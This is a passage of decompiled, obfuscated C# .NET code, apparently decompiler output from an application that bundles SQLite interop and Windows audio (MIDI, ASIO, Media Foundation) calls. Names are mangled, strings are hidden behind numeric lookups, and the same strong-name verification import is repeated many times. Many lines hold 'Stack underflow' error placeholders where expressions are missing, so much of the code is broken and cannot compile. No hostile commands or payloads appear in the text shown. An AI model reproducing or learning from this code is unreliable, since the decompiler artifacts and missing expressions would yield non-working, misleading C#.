			return _0018._0001(dateTimeKind, text, sQLiteDateFormats, P_1);
		}

		static void _0001(global::_0010._0019 P_0)
		{
			//IL_0031: Incompatible stack heights: 0 vs 2
			//IL_0038: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_0010._0019)/*Error near IL_000c: Stack underflow*/)._0001._0001(ref global::_0010._0019._0001, _001F._0017._0019, IntPtr.Zero, out var obj);
			/*Error near IL_003f: Stack underflow*/((int)/*Error near IL_003f: Stack underflow*/);
			P_0._0001 = new global::_0010._0018(obj as global::_0002._0016);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _001B._0004 _0001(_001E._0004 _0002, global::_0005._0005 P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			_001B._0004 result = default(_001B._0004);
			_ = _0098._0089_0004;
			/*Error near IL_002e: Stack underflow*/((object)/*Error near IL_002e: Stack underflow*/);
			int num = (int)/*Error near IL_0031: Stack underflow*/;
			_0018._0001(ref result, num);
			result._0001(P_1);
			return result;
		}

		[DllImport("mfplat.dll", EntryPoint = "MFTEnumEx", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001([In] Guid _0002, [In] global::_0001._0013 _0003, [In] global::_0010._0014 _0004, [In] global::_0010._0014 _0005, out IntPtr _0006, out int _0007);

		static void _0001(global::_000E._000E P_0)
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 2
			if (((global::_000E._000E)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_009A;
				_007F._0007 obj = ((global::_000E._000E)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_0049: Stack underflow*/(obj);
				P_0._0001 = null;
			}
			if (P_0._0001 != null)
			{
				global::_0008._007E_0018_0002(P_0._0001);
				P_0._0001 = null;
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_int64")]
		static extern void _0001(IntPtr _0002, long _0003);

		unsafe static void _0001(_007F._0013 _0002, double _0003, ref double P_2)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Expected F8, but got Unknown
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			double num = ((_007F._0013)/*Error near IL_000b: Stack underflow*/)._0003;
			double num2 = P_2;
			_003F val = /*Error near IL_0011: Stack underflow*/+ num * (num2 - _0003);
			*(double*)(nint)/*Error near IL_0012: Stack underflow*/ = (double)val;
		}

		static void _0001(string _0002)
		{
			//IL_00ac: Incompatible stack heights: 0 vs 1
			//IL_00b8: Incompatible stack heights: 0 vs 1
			_0018._0001();
			global::_0007._001B obj = default(global::_0007._001B);
			if (0 == 0)
			{
				obj = (global::_0007._001B)/*Error near IL_00b2: Stack underflow*/;
			}
			if ((int)/*Error near IL_0013: Stack underflow*/ != 0)
			{
				obj._0001(_0002);
				return;
			}
			object obj2;
			_0091_0002._009C_0005(obj2 = global::_0007._001C._0001);
			try
			{
				if (!global::_0007._001C._0001.TryGetValue(_0002, out var value))
				{
					return;
				}
				value._0001++;
				Queue<WeakReference> queue = value._0001;
				if (queue == null)
				{
					return;
				}
				while (queue.Count > 0)
				{
					WeakReference weakReference = queue.Dequeue();
					if (weakReference != null)
					{
						global::_000E._001F obj3 = _0083_0003._007E_001A_0007(weakReference) as global::_000E._001F;
						if (obj3 != null)
						{
							global::_0008._007E_0007_0002(obj3);
						}
						_0091_0002._009E_0005(obj3);
					}
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj2);
			}
		}

		static global::_0005._0005 _0001(int _0002, int _0003)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			new global::_0005._0005();
			global::_0005._0005 obj = (global::_0005._0005)/*Error near IL_004c: Stack underflow*/;
			((global::_0005._0005)/*Error near IL_000c: Stack underflow*/)._0001 = WaveFormatEncoding.IeeeFloat;
			obj._0001 = (short)_0003;
			obj._0003 = 32;
			obj._0001 = _0002;
			obj._0002 = (short)(4 * _0003);
			obj._0002 = _0002 * obj._0002;
			obj._0004 = 0;
			return obj;
		}

		static void _0001(global::_0003._0016 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0003._0016)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0003._0016).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static SortedList<string, string> _0001(string _0002, bool _0003, global::_0017._0080 _0004, bool _0005)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return _0018._0001((string)/*Error near IL_000e: Stack underflow*/, (byte)/*Error near IL_000e: Stack underflow*/ != 0, _0004);
			}
			return _0018._0001(_0004, _0002, _0004: false);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0005._0006._0001 _0001(BinaryReader _0002)
		{
			//IL_002f: Incompatible stack heights: 0 vs 3
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			_ = global::_0012._007E_0091_0002;
			_ = _0005_0003._007E_0082_0006;
			/*Error near IL_0036: Stack underflow*/((object)/*Error near IL_0036: Stack underflow*/);
			/*Error near IL_003d: Stack underflow*/((object)/*Error near IL_003d: Stack underflow*/);
			return new global::_0005._0006._0001((uint)/*Error near IL_0011: Stack underflow*/, _0018._0001(_0002), _0018._0001(_0083_0002._007E_008C_0005(_0002, 4)));
		}

		static void _0001(int _0002, string _0003, global::_0017._0080 _0004, global::_0002._001B _0005, int _0006, global::_0017._0080 _0007, string P_6)
		{
			//IL_0146: Incompatible stack heights: 0 vs 1
			//IL_0157: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0150: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_0014: Stack underflow*/)._0001 != ConnectionState.Open)
			{
				throw new InvalidOperationException(_0080._0014._0001(107356557));
			}
			if (_0004 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107356516));
			}
			if (_0004._0001 != ConnectionState.Open)
			{
				throw new ArgumentException(_0080._0014._0001(107356531), _0080._0014._0001(107356516));
			}
			if (P_6 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107356454));
			}
			if (_0003 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403164));
			}
			_0013 obj = _0007._0001;
			if (obj == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107356465));
			}
			global::_0018._001A obj2 = null;
			try
			{
				obj2 = obj._0001(_0004, P_6, _0003);
				bool flag = false;
				while (obj._0001(obj2, _0002, ref flag) && (_0005 == null || _0005(_0007, _0003, _0004, P_6, _0002, obj._0001(obj2), obj._0002(obj2), flag)))
				{
					if (flag && _0006 >= 0)
					{
						global::_0007._0096(_0006);
					}
					if (_0002 == 0)
					{
						break;
					}
				}
			}
			catch (Exception ex)
			{
				if ((_0007._0003 & SQLiteConnectionFlags.LogBackup) == SQLiteConnectionFlags.LogBackup)
				{
					_0018._0001(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107355896), new object[1] { ex }));
				}
				throw;
			}
			finally
			{
				if (obj2 != null)
				{
					obj._0001(obj2);
				}
			}
		}

		static void _0001(int _0002, string _0003, global::_0001._001F _0004)
		{
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001((global::_0001._001F)/*Error near IL_006c: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_006f: Stack underflow*/;
			_0018._0001(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107355831), new object[4]
			{
				intPtr,
				_0002,
				_0091._0080_0004(typeof(string).TypeHandle),
				(_0003 != null) ? _0003 : _0080._0014._0001(107357341)
			}));
		}

		[DllImport("winmm.dll", EntryPoint = "midiStreamStop")]
		static extern MmResult _0001(IntPtr _0002);

		static void _0001(global::_000E._0005 P_0)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			_0005[] array = ((global::_000E._0005)/*Error near IL_0007: Stack underflow*/)._0001;
			foreach (_0005 obj in array)
			{
				if ((obj._0001._0001 & global::_000E._0004._0004) != global::_000E._0004._0004)
				{
					_0018._0001(obj);
				}
			}
		}

		static double _0001(ulong _0002)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Incompatible stack heights: 0 vs 1
			return (double)(/*Error near IL_0009: Stack underflow*/ - int.MaxValue - 1) + 2147483648.0;
		}

		static int _0001(global::_0015._0012 P_0)
		{
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((global::_0015._0012)/*Error near IL_000c: Stack underflow*/)._0001._0001(out var result);
			/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
			return result;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_error_toobig")]
		static extern void _0001(IntPtr _0002);

		static void _0001(int _0002, int _0003, global::_0002._0008 _0004, byte[] P_3)
		{
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			if (((global::_0002._0008)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				_0019._0010 obj = new _0019._0010(((global::_0002._0008)/*Error near IL_0012: Stack underflow*/).BufferLength);
				((global::_0002._0008)/*Error near IL_001c: Stack underflow*/)._0001 = obj;
			}
			if (_0018._0001(_0004._0001, P_3, _0002, _0003) < _0003 && !_0004.DiscardOnBufferOverflow)
			{
				throw new InvalidOperationException(_0080._0014._0001(107355738));
			}
		}

		static string _0001()
		{
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			_ = _0006_0004._007E_0012_0008;
			_0097_0004._001F_000E();
			_0080._0014._0001(107355689);
			/*Error near IL_0052: Stack underflow*/((object)/*Error near IL_0052: Stack underflow*/, (string)/*Error near IL_0052: Stack underflow*/);
			string text = /*Error near IL_0016: Stack underflow*/as string;
			if (global::_001C._0096_0003(text))
			{
				text = global::_0002._007E_0019(_0097_0004._001F_000E());
			}
			return text;
		}

		static bool _0001(global::_0005._0005 _0002, global::_0003._000F _0003, global::_0007._0014 P_2)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			global::_0002._0005 obj = default(global::_0002._0005);
			return _0018._0001((global::_0003._000F)/*Error near IL_000d: Stack underflow*/, (global::_0007._0014)/*Error near IL_000d: Stack underflow*/, (global::_0005._0005)/*Error near IL_000d: Stack underflow*/, ref obj);
		}

		static void _0001(int _0002, float[] _0003, int _0004)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0004; i++)
			{
				_003F val = /*Error near IL_000b: Stack underflow*/+ _0002;
				((float[])/*Error near IL_0011: Stack underflow*/)[val] = 0f;
			}
		}

		static int _0001(global::_0017._007F._0003 _0002, global::_0017._007F._0002 _0003, int P_2)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 2
			//IL_00ae: Expected I4, but got Unknown
			//IL_00ae: Incompatible stack heights: 0 vs 1
			_ = 32768;
			int num = ((global::_0017._007F._0003)/*Error near IL_0014: Stack underflow*/)._0004;
			Math.Min(val2: /*Error near IL_0015: Stack underflow*/- num, val1: (int)/*Error near IL_00ae: Stack underflow*/);
			P_2 = Math.Min(val2: _0003.AvailableBytes, val1: (int)/*Error near IL_0025: Stack underflow*/);
			int num2 = 32768 - _0002._0003;
			int num3;
			if (P_2 > num2)
			{
				num3 = _0018._0001(_0003, _0002._0001, _0002._0003, num2);
				if (num3 == num2)
				{
					num3 += _0018._0001(_0003, _0002._0001, 0, P_2 - num2);
				}
			}
			else
			{
				num3 = _0018._0001(_0003, _0002._0001, _0002._0003, P_2);
			}
			_0002._0003 = (_0002._0003 + num3) & 0x7FFF;
			_0002._0004 += num3;
			return num3;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(int[] _0002, global::_0017._007F._0007._0001 P_1)
		{
			//IL_01d5: Incompatible stack heights: 0 vs 1
			//IL_01db: Incompatible stack heights: 0 vs 1
			//IL_01e1: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[((global::_0017._007F._0007._0001)/*Error near IL_000f: Stack underflow*/)._0001.Length];
			((global::_0017._007F._0007._0001)/*Error near IL_001b: Stack underflow*/)._0001 = array;
			int num = ((Array)/*Error near IL_0021: Stack underflow*/).Length / 2;
			int num2 = (num + 1) / 2;
			int num3 = 0;
			for (int i = 0; i < P_1._0003; i++)
			{
				P_1._0001[i] = 0;
			}
			int[] array2 = new int[num];
			array2[num - 1] = 0;
			for (int num4 = num - 1; num4 >= 0; num4--)
			{
				if (_0002[2 * num4 + 1] != -1)
				{
					int num5 = array2[num4] + 1;
					if (num5 > P_1._0003)
					{
						num5 = P_1._0003;
						num3++;
					}
					array2[_0002[2 * num4]] = (array2[_0002[2 * num4 + 1]] = num5);
				}
				else
				{
					int num6 = array2[num4];
					P_1._0001[num6 - 1]++;
					P_1._0001[_0002[2 * num4]] = (byte)array2[num4];
				}
			}
			if (num3 == 0)
			{
				return;
			}
			int num7 = P_1._0003 - 1;
			while (true)
			{
				if (P_1._0001[--num7] != 0)
				{
					do
					{
						P_1._0001[num7]--;
						P_1._0001[++num7]++;
						num3 -= 1 << P_1._0003 - 1 - num7;
					}
					while (num3 > 0 && num7 < P_1._0003 - 1);
					if (num3 <= 0)
					{
						break;
					}
				}
			}
			P_1._0001[P_1._0003 - 1] += num3;
			P_1._0001[P_1._0003 - 2] -= num3;
			int num8 = 2 * num2;
			for (int num9 = P_1._0003; num9 != 0; num9--)
			{
				int num10 = P_1._0001[num9 - 1];
				while (num10 > 0)
				{
					int num11 = 2 * _0002[num8++];
					if (_0002[num11 + 1] == -1)
					{
						P_1._0001[_0002[num11]] = (byte)num9;
						num10--;
					}
				}
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutPrepareHeader")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0007 _0003, int _0004);

		static void _0001(_001E._0004 _0002, int _0003, global::_0005._0005 P_2)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_0018._0001((_001E._0004)/*Error near IL_0036: Stack underflow*/, (global::_0005._0005)/*Error near IL_0036: Stack underflow*/);
			_001B._0004 obj = (_001B._0004)/*Error near IL_0007: Stack underflow*/;
			bool num = _0018._0001(global::_0017._0005._0001, obj, _0002, _0003);
			_0018._0001(ref obj);
			if (!num)
			{
				throw new ArgumentException(_0080._0014._0001(107355700));
			}
		}

		unsafe static double _0001(double _0002, out int _0003)
		{
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Expected F8, but got Unknown
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 3
			//IL_0072: Incompatible stack heights: 0 vs 1
			_ = global::_0015._0098_0002;
			_ = global::_0015._009D_0002;
			/*Error near IL_0072: Stack underflow*/((double)/*Error near IL_0072: Stack underflow*/);
			double num = global::_0015._009D_0002(2.0);
			_003F val = /*Error near IL_0024: Stack underflow*// num;
			double num2 = /*Error near IL_0029: Stack underflow*/((double)val);
			*(int*)(nint)/*Error near IL_002d: Stack underflow*/ = (int)num2 + 1;
			return 1.0 - (global::_0014._0095_0002(2.0, _0003) - _0002) / global::_0014._0095_0002(2.0, _0003);
		}

		static void _0001(_001B._0004 _0002, _001E._0004 _0003, int P_2)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_0026: Incompatible stack heights: 0 vs 1
			_ = 0;
			if (!_0018._0001((int)/*Error near IL_000c: Stack underflow*/, (global::_0017._0005)/*Error near IL_000c: Stack underflow*/, (_001E._0004)/*Error near IL_000c: Stack underflow*/, (_001B._0004)/*Error near IL_000c: Stack underflow*/))
			{
				throw new ArgumentException(_0080._0014._0001(107355700));
			}
		}

		static int _0001(global::_0017._007F._0003 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0017._007F._0003)/*Error near IL_0007: Stack underflow*/)._0004;
		}

		static void _0001(global::_000E._001F _0002, IntPtr _0003)
		{
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 2
			//IL_0057: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return;
			}
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0057: Stack underflow*/((IntPtr)/*Error near IL_0057: Stack underflow*/, zero);
			if ((int)/*Error near IL_0014: Stack underflow*/ != 0)
			{
				return;
			}
			try
			{
			}
			finally
			{
				global::_000E._001F obj;
				_0091_0002._009C_0005(obj = _0002);
				try
				{
					_0080._0017 obj2 = _0018._0001(_0003);
					if (obj2 != 0)
					{
						throw new SQLiteException(obj2, _0018._0001(_0002, _0003));
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		static short _0001(int _0002)
		{
			//IL_0008: Invalid comparison between Unknown and I4
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			short num = (short)/*Error near IL_0003: Stack underflow*/;
			if ((int)/*Error near IL_000a: Stack underflow*/ == num)
			{
				return num;
			}
			if (_0002 > 32767)
			{
				return short.MaxValue;
			}
			return short.MinValue;
		}

		static bool _0001(bool _0002, bool _0003, global::_0017._007F._0008 P_2)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			bool flag2;
			do
			{
				_0018._0001((global::_0017._007F._0008)/*Error near IL_003f: Stack underflow*/);
				bool flag = (int)/*Error near IL_0008: Stack underflow*/ != 0 && P_2._0017 == P_2._0018;
				flag2 = _0018._0001(_0002, flag, P_2);
			}
			while (P_2._0001._0002 == 0 && flag2);
			return flag2;
		}

		static void _0001(global::_0007._001B _0002)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0007._001C._0001;
			/*Error near IL_0030: Stack underflow*/((object)/*Error near IL_0030: Stack underflow*/);
			try
			{
				global::_0007._001C._0001 = (global::_0007._001B)/*Error near IL_0016: Stack underflow*/;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmFormatChooseW")]
		static extern MmResult _0001(ref _000E _0002);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_name_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static void _0001(global::_0007._001E _0002, _0016[] P_1)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			int num = ((Array)/*Error near IL_0003: Stack underflow*/).Length;
			for (int i = 0; i < num; i++)
			{
				_0002.Add(P_1[i]);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_blob_bytes")]
		static extern int _0001(IntPtr _0002);

		static void _0001(Exception _0002, global::_0006._0003 P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new global::_0006._0003._0001();
			global::_0006._0003._0001 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (global::_0006._0003._0001)/*Error near IL_006f: Stack underflow*/;
			}
			((global::_0006._0003._0001)/*Error near IL_000e: Stack underflow*/)._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (P_1._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(P_1, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(P_1._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((global::_0006._0003._0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((global::_0006._0003._0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((global::_0006._0003._0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		static void _0001(out long _0002, global::_0017._0015 _0003, int P_2)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001c: Stack underflow*/(pUnknown, out _0002, P_2);
			string text = _0080._0014._0001(107355667);
			_0018._0001((global::_0017._0015)/*Error near IL_002b: Stack underflow*/, num, text);
		}

		static _0019._001A _0001(global::_0015._0013 _0002, int P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0015._0013)/*Error near IL_002d: Stack underflow*/, (int)/*Error near IL_002d: Stack underflow*/);
			global::_0006._0012 obj = (global::_0006._0012)/*Error near IL_0007: Stack underflow*/;
			global::_0007._0097(_0002._0001._0001(ref obj, out var result));
			return result;
		}

		[DllImport("winmm.dll", EntryPoint = "midiStreamPosition")]
		static extern MmResult _0001(IntPtr _0002, [MarshalAs(UnmanagedType.Struct)] ref global::_0018._0012._0005 _0003, int _0004);

		static void _0001(IntPtr _0002)
		{
			//IL_0128: Incompatible stack heights: 0 vs 2
			//IL_0132: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0132: Stack underflow*/((IntPtr)/*Error near IL_0132: Stack underflow*/, zero);
			if ((int)/*Error near IL_0016: Stack underflow*/ == 0)
			{
				int num = 0;
				num = _0018._0001(num, 4, _001B_0003._0097_0006());
				IntPtr intPtr = _0018._0001(_0002, num);
				int num2 = num;
				num = _0018._0001(num, _001B_0003._0097_0006(), 4);
				num = _0018._0001(num, 4, _001B_0003._0097_0006());
				IntPtr intPtr2 = _0018._0001(_0002, num);
				int num3 = num;
				num = _0018._0001(num, _001B_0003._0097_0006(), _001B_0003._0097_0006());
				IntPtr intPtr3 = _0018._0001(_0002, num);
				int num4 = num;
				if (_0090_0002._0099_0005(intPtr3, IntPtr.Zero))
				{
					_0018._0001(intPtr3);
					intPtr3 = IntPtr.Zero;
					_0018._0001(num4, _0002, intPtr3);
				}
				if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero))
				{
					_0018._0001(intPtr2);
					intPtr2 = IntPtr.Zero;
					_0018._0001(num3, _0002, intPtr2);
				}
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					_0018._0001(intPtr);
					intPtr = IntPtr.Zero;
					_0018._0001(num2, _0002, intPtr);
				}
				if (_0090_0002._0099_0005(_0002, IntPtr.Zero))
				{
					_0018._0001(_0002);
					_0002 = IntPtr.Zero;
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._007F._0007 P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			((global::_0017._007F._0007)/*Error near IL_0008: Stack underflow*/)._000E = 0;
			((global::_0017._007F._0007)/*Error near IL_0010: Stack underflow*/)._000F = 0;
		}

		static string _0001(global::_0006._0003 _0002, int P_1)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = ((global::_0006._0003)/*Error near IL_003a: Stack underflow*/).DriverInputChannelCount;
			if (/*Error near IL_0008: Stack underflow*/ <= /*Error near IL_0008: Stack underflow*/)
			{
				return _0002._0001._0001._0001[P_1]._0001;
			}
			return _0080._0014._0001(107396634);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(string _0002, int _0003, _001C._0004 _0004 = 192000)
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			Guid guid = _001F._0011._0012;
			_ = ((_001C._0004)/*Error near IL_0052: Stack underflow*/).WaveFormat;
			global::_0005._0005 obj = (global::_0005._0005)/*Error near IL_000c: Stack underflow*/;
			MediaFoundationEncoder mediaFoundationEncoder = new MediaFoundationEncoder(_0018._0001(_0003, guid, obj) ?? throw new InvalidOperationException(_0080._0014._0001(107356158)));
			try
			{
				_0018._0001(_0002, _0004, mediaFoundationEncoder);
			}
			finally
			{
				if (mediaFoundationEncoder != null)
				{
					global::_0008._007E_0098(mediaFoundationEncoder);
				}
			}
		}

		static bool _0001(DbType _0002, global::_0001._001D P_1)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			if (((global::_0001._001D)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				return false;
			}
			_ = ((global::_0001._001D)/*Error near IL_0012: Stack underflow*/)._0001;
			return ((Dictionary<DbType, global::_0006._0018>)/*Error near IL_0019: Stack underflow*/).ContainsKey((DbType)/*Error near IL_0019: Stack underflow*/);
		}

		static bool _0001()
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0002._0019._0001;
			/*Error near IL_004b: Stack underflow*/((object)/*Error near IL_004b: Stack underflow*/);
			try
			{
				bool flag = global::_0015._0016.Enabled;
				global::_0015._0016.Enabled = false;
				try
				{
					_0018._0001(global::_0016._001B._0001);
					_0080._0017 obj2 = (_0080._0017)/*Error near IL_001f: Stack underflow*/;
					return obj2 == _0080._0017._001C;
				}
				finally
				{
